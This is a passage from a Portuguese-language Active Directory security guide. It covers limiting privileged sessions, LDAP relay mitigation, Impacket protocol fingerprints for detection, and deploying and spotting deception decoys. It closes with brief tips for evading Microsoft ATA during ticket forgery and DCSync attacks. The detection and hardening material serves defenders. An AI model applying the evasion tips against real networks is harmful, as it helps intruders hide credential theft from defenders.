- **Limitação temporal de privilégios**: para tarefas que exigem privilégios de DA, sua duração deve ser limitada. Isso pode ser feito com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigação de relay LDAP**: audite os Event IDs 2889/3074/3075 e, em seguida, imponha a assinatura LDAP e a vinculação de canal LDAPS em DCs/clientes para bloquear tentativas de MITM/relay LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impressão digital em nível de protocolo de atividade do Impacket

Se você quiser detectar técnicas comuns de AD, **não confie apenas em artefatos controlados pelo operador**, como binários renomeados, nomes de serviço, arquivos batch temporários ou caminhos de saída. Estabeleça uma linha de base de como clientes Windows legítimos geram tráfego de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI e, em seguida, procure **peculiaridades de implementação** que persistam mesmo depois de o operador editar `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Possíveis indicadores isolados de alta confiança** (após validação em relação à sua própria linha de base):
  - DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
  - Preenchimento de autenticação DCE/RPC composto por `0xff`
  - Vínculos Kerberos LDAP que colocam um `AP-REQ` Kerberos bruto diretamente em `mechToken` do SPNEGO
  - Solicitações de negociação SMB2/3 com valores de `ClientGuid` que parecem ASCII
  - `WMI IWbemLevel1Login::NTLMLogin` usando o namespace não padrão `//./root/cimv2`
  - Valores de nonce Kerberos fixos
- **Melhores como atributos de correlação/pontuação**:
  - Listas esparsas ou duplicadas de etype Kerberos, `PA-DATA` incomum/ausente ou ordenação de etype em TGS-REQ diferente da nativa do Windows
  - Mensagens NTLM Type 1 sem informações de versão ou mensagens Type 3 com nomes de host nulos
  - NTLMSSP bruto transportado em DCE/RPC em vez de SPNEGO, trailers de verificação DCE/RPC ausentes ou incompatibilidades entre OID de SPNEGO/Kerberos
  - Várias dessas características do mesmo host/usuário/sessão/período são muito mais indicativas do que qualquer campo fraco isolado
- **Use como enriquecimento, não como alertas isolados**:
  - Nomes de arquivo padrão, caminhos de saída, nomes de serviço aleatórios, nomes de arquivos batch temporários, nomes padrão de contas de computador e strings específicas de ferramentas para HTTP/WebDAV/RDP/MSSQL
  - São fáceis de alterar pelo operador e são mais úteis para explicar por que um agrupamento entre protocolos é suspeito
- **Observações operacionais**:
  - Alguns desses sinais exigem tráfego descriptografado, análise de [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou visibilidade do lado do serviço
  - Valide-os em relação a clientes Samba/Linux, appliances e software legado antes de promovê-los a alertas
  - Promova as detecções de enriquecimento -> caça a ameaças -> alertas conforme aumenta a confiança na linha de base

### **Implementação de técnicas de deception**

- A implementação de deception envolve criar armadilhas, como usuários ou computadores-isca, com características como senhas que não expiram ou marcadas como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos com altos privilégios.<sup>[[2]](#references)</sup>
- Um exemplo prático usa ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Saiba mais sobre a implantação de técnicas de deception em [Deploy-Deception no GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificação de deception**

- **Para objetos de usuário**: indicadores suspeitos incluem ObjectSID atípico, logins pouco frequentes, datas de criação e baixa contagem de senhas incorretas.
- **Indicadores gerais**: comparar atributos de possíveis objetos-isca com os de objetos legítimos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar esse tipo de deception.

### **Como contornar sistemas de detecção**

- **Como contornar a detecção do Microsoft ATA**:
  - **Enumeração de usuários**: evitar a enumeração de sessões em Domain Controllers para impedir a detecção pelo ATA.
  - **Impersonação de tickets**: usar chaves **aes** para criar tickets ajuda a evitar a detecção, pois não há downgrade para NTLM.
  - **Ataques DCSync**: recomenda-se executá-los em um sistema que não seja Domain Controller para evitar a detecção pelo ATA, pois a execução direta em um Domain Controller acionará alertas.

## References

- [1] [Um guia para atacar relações de confiança de domínio](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjando relações de confiança para deception no Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Coleção LDAP BOF – Kit de ferramentas LDAP em memória para exploração do Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Transformando hashes NTLM em uma wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (laboratório AD do NetExec) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analisando o Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: assumindo o controle de contas do Active Directory por meio do Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Como gerenciar as alterações nas conexões de canal seguro do Netlogon associadas à CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Uma jornada pelas interfaces Null Session e MS-RPC esquecidas](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [O filtro SID como limite de segurança entre domínios? (Parte 4) - Pesquisa sobre como contornar a filtragem de SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [O filtro SID como limite de segurança entre domínios? (Parte 5) - Ataque de confiança Golden GMSA - do domínio filho ao pai](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [O filtro SID como limite de segurança entre domínios? (Parte 6) - Ataque de confiança por alteração do schema - do domínio filho ao pai](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA a EA com ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalonando de administradores do domínio filho para administradores corporativos em 5 minutos abusando do AD CS: continuação](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Um ACE na manga: projetando backdoors DACL do Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Código-fonte do módulo pre2k do NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atributo msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
